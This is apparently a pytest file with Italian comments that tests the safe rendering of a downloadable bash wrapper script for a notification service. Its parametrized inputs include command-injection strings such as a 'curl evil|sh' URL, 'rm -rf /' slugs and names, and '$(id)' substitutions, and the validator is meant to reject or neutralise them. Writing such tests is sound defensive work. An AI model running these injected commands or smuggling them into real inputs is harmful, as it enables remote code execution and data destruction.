"""Rendering di `scripts/notifyhub-run.sh` per il pulsante "Scarica lo script".

Due rischi da tenere fermi: che il template venga modificato in modo che la
sostituzione non trovi piu' le righe da riscrivere (e l'operatore si porti a casa
uno script senza slug), e che un valore interpolato diventi codice sulla macchina
che esegue il cron.
"""

import subprocess

import pytest

from app.services.wrapper_script import (
    SLUG_LINE_PREFIX,
    URL_LINE_PREFIX,
    WrapperTemplateError,
    load_template,
    render_wrapper_script,
    script_filename,
    template_candidates,
)

SLUG = "maritime-elog-test-cw2k2WWnmLalhpeyvfnCCQ"


def _render(template: str | None = None, **kwargs) -> str:
    parametri = {
        "base_url": "https://notifyhub.com",
        "slug": SLUG,
        "receiver_name": "elog-test",
        "group_name": "maritime",
    }
    parametri.update(kwargs)
    return render_wrapper_script(template if template is not None else load_template(), **parametri)


@pytest.mark.unit
def test_template_trovato_accanto_al_codice():
    assert any(candidate.is_file() for candidate in template_candidates()), (
        f"nessun template in {[str(c) for c in template_candidates()]}"
    )


@pytest.mark.unit
def test_template_ha_esattamente_una_riga_url_e_una_slug():
    """Il contratto fra script e backend: se qualcuno rinomina le variabili nel
    wrapper, questo test fallisce prima che il download inizi a servire uno
    script non compilato."""
    righe = load_template().split("\n")
    assert sum(1 for r in righe if r.startswith(URL_LINE_PREFIX)) == 1
    assert sum(1 for r in righe if r.startswith(SLUG_LINE_PREFIX)) == 1


@pytest.mark.unit
def test_render_scrive_url_e_slug():
    script = _render()
    assert 'URL="${NOTIFYHUB_URL:-https://notifyhub.com}"' in script
    assert f'SLUG="${{NOTIFYHUB_SLUG:-{SLUG}}}"' in script
    # Le variabili d'ambiente restano davanti al valore scritto: chi ha gia' un
    # NOTIFYHUB_URL nell'ambiente non si vede scavalcare.
    assert "${NOTIFYHUB_URL:-" in script
    assert "${NOTIFYHUB_SLUG:-" in script


@pytest.mark.unit
def test_render_aggiunge_il_commento_di_provenienza():
    script = _render(receiver_name="elog-test", group_name="maritime")
    assert '# Precompilato dalla dashboard per il receiver "elog-test"' in script
    assert 'del gruppo "maritime"' in script


@pytest.mark.unit
def test_render_lascia_intatto_il_resto_dello_script():
    template = load_template()
    script = _render(template)
    interessanti = [
        riga
        for riga in template.split("\n")
        if not riga.startswith((URL_LINE_PREFIX, SLUG_LINE_PREFIX))
    ]
    for riga in interessanti:
        assert riga in script.split("\n")


@pytest.mark.unit
def test_render_resta_bash_valido(tmp_path):
    """La prova che conta: `bash -n` sullo script servito. Una sostituzione che
    rompesse le virgolette passerebbe ogni assert testuale e fallirebbe qui."""
    percorso = tmp_path / "notifyhub-run.sh"
    percorso.write_text(_render(), encoding="utf-8")
    esito = subprocess.run(  # noqa: S603
        ["/bin/bash", "-n", str(percorso)], capture_output=True, text=True
    )
    assert esito.returncode == 0, esito.stderr


@pytest.mark.unit
@pytest.mark.parametrize(
    "base_url",
    [
        'https://notifyhub.com"; curl evil|sh; #',
        "https://notifyhub.com$(id)",
        "https://notifyhub.com`id`",
        "https://notifyhub.com}",
        "ftp://notifyhub.com",
        "notifyhub.com",  # senza schema: qui il valore deve arrivare normalizzato
    ],
)
def test_render_rifiuta_url_non_sicure(base_url):
    with pytest.raises(WrapperTemplateError):
        _render(base_url=base_url)


@pytest.mark.unit
@pytest.mark.parametrize(
    "slug",
    ["", 'a"; rm -rf /', "slug con spazi", "slug$(id)", "a" * 200],
)
def test_render_rifiuta_slug_non_sicuri(slug):
    with pytest.raises(WrapperTemplateError):
        _render(slug=slug)


@pytest.mark.unit
def test_render_nomi_su_una_riga_sola():
    """Un nome di receiver con un ritorno a capo non deve poter uscire dal
    commento e diventare una riga di script."""
    script = _render(receiver_name='elog"\nrm -rf /tmp\n#', group_name="maritime")
    assert "rm -rf /tmp" in script  # il testo resta, dentro il commento
    riga = next(r for r in script.split("\n") if "Precompilato dalla dashboard" in r)
    assert "rm -rf /tmp" in riga
    percorso_valido = "\n".join(script.split("\n"))
    assert percorso_valido.count("\n#") >= 1


@pytest.mark.unit
def test_render_nome_illeggibile_non_svuota_il_commento():
    script = _render(receiver_name="🚢", group_name="🚢")
    assert '"senza nome"' in script


@pytest.mark.unit
def test_render_template_senza_le_righe_attese():
    with pytest.raises(WrapperTemplateError):
        _render("#!/bin/bash\necho niente da sostituire\n")


@pytest.mark.unit
def test_render_template_con_righe_duplicate():
    duplicato = (
        f'#!/bin/bash\n{URL_LINE_PREFIX}x}}"\n{URL_LINE_PREFIX}y}}"\n{SLUG_LINE_PREFIX}}}"\n'
    )
    with pytest.raises(WrapperTemplateError):
        _render(duplicato)


@pytest.mark.unit
@pytest.mark.parametrize(
    ("nome", "atteso"),
    [
        ("elog-test", "notifyhub-run-elog-test.sh"),
        ("Backup notturno", "notifyhub-run-backup-notturno.sh"),
        ("🚢", "notifyhub-run.sh"),
    ],
)
def test_script_filename(nome, atteso):
    assert script_filename(nome) == atteso


@pytest.mark.unit
def test_script_filename_non_contiene_lo_slug():
    """Il nome del file finisce nell'elenco della cartella dei download e nella
    cronologia del browser: lo slug e' una credenziale, non ci va."""
    assert SLUG not in script_filename("elog-test")


@pytest.mark.unit
def test_bash_n_su_uno_script_con_nome_ostile(tmp_path):
    percorso = tmp_path / "ostile.sh"
    percorso.write_text(
        _render(receiver_name='x"; rm -rf /; echo "', group_name="$(id)`id`"), encoding="utf-8"
    )
    esito = subprocess.run(  # noqa: S603
        ["/bin/bash", "-n", str(percorso)], capture_output=True, text=True
    )
    assert esito.returncode == 0, esito.stderr
